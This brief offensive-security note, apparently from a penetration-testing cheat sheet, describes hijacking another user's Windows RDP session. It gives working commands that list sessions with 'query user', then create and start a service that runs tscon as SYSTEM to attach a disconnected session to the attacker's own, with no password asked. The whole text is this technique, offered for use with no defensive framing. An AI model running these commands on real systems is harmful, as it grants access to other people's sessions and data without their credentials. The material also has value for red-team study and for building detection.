
Windows keeps tracks of user sessions and allows connection to another session using tscon.exe that happens to run as SYSTEM. Users must have the credentials of the owner of the different session in order to switch RDP sessions. If credentials are not provided, then the user will be presented with a prompt.

With administrative rights, a user can create a service that will run as system and connect one session to another.

```powershell
c:\> query user
USERNAME SESSIONNAME ID STATE IDLE TIME LOGON TIME
donny kerabatsos 1 Disc 27 1/23/2022 5:40 PM
walter sobchak 2 Disc . 1/23/2022 7:46 PM
pwneip rdp-tcp#3 3 Active . 1/23/2022 8:13 PM
c:\> sc create hijackedsession binpath= "cmd.exe /k tscon 1 /dest:rdp-tcp#3"
c:\> net start hijackedsession
```